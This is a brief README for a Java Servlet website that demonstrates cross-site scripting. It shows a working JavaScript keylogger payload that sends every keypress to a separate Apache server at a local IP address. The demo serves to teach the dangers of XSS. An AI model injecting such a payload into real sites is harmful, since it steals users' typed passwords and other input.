# XSS-Demo
I made this website using *Java Servlets* for giving a demo of **XSS and its dangers**.

I hosted the website on my **Tomcat** Server and used **Apache** for **Keylogging**.

![XSS](https://github.com/Miraj50/XSS-Demo/blob/master/XSS_Demo.gif)

The *payload* used for Keylogging:
```
document.addEventListener('keypress', function() {
	console.log(arguments[0].key); //Testing
	$.ajax({
		type: 'GET',
		url: 'http://192.168.0.105', //apache
		data: { 
			'key': arguments[0].key, 
		},
	});
});
```
